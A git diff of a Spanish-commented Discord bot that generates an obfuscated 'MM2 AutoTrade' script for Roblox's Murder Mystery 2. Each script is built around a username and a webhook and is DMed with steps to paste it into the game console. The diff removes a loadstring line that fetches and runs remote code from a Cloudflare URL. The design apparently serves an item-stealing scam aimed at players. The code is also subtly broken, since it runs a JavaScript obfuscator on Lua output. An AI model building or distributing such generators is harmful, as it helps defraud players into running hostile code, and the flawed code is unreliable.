@@ -143,32 +143,47 @@ client.on('interactionCreate', async (interaction) => {
           // Generar script personalizado
           const script = await generateScript(game, username, webhook);
 
-          // Enviar a Cloudflare para almacenar
-          const scriptId = await uploadToCloudflare(script);
-
-          // Generar loadstring
-          const loadstring = `load(game:HttpGet("${CLOUDFLARE_URL}/decode?id=${scriptId}"))()`;
+          // Ofuscar el script
+          const obfuscated = JavaScriptObfuscator.obfuscate(script, {
+            compact: true,
+            controlFlowFlattening: false,
+            unicodeEscapeSequence: false,
+          }).getObfuscatedCode();
 
           // Enviar DM al usuario
           try {
             const dmChannel = await interaction.user.createDM();
+
+            // Dividir el script en partes si es muy largo
+            const maxLength = 1950;
+            const parts = [];
+            for (let i = 0; i < obfuscated.length; i += maxLength) {
+              parts.push(obfuscated.substring(i, i + maxLength));
+            }
+
             const embed = new EmbedBuilder()
               .setColor(Colors.Green)
-              .setTitle('🔪 Tu Script MM2 AutoTrade')
-              .setDescription('Copia el loadstring y ejecuta en tu consola de Roblox (F9)')
+              .setTitle('🔪 Tu Script MM2 AutoTrade - Ofuscado')
+              .setDescription('Tu script está listo. Cópialo y ejecuta en tu consola de Roblox (F9)')
               .addFields(
                 { name: '👤 Usuario Configurado', value: `\`${username}\``, inline: true },
                 { name: '🎮 Juego', value: 'Murder Mystery 2', inline: true },
-                { name: '📋 Loadstring', value: `\`\`\`\n${loadstring}\n\`\`\`` },
                 {
                   name: '⚙️ Instrucciones',
-                  value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. Pega y ejecuta el loadstring',
+                  value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. Copia y pega todo el script\n5. Presiona Enter',
                 }
               )
-              .setFooter({ text: 'AutoTrade MM2 | Script ofuscado y comprimido' })
+              .setFooter({ text: 'AutoTrade MM2 | Script ofuscado' })
               .setTimestamp();
 
             await dmChannel.send({ embeds: [embed] });
+
+            // Enviar el script en partes
+            for (let i = 0; i < parts.length; i++) {
+              const partNum = parts.length > 1 ? ` (Parte ${i + 1}/${parts.length})` : '';
+              await dmChannel.send(`\`\`\`lua\n${parts[i]}\n\`\`\`${partNum}`);
+            }
+
             await interaction.editReply({
               content: '✅ Script generado exitosamente. Revisa tu DM privado.',
             });
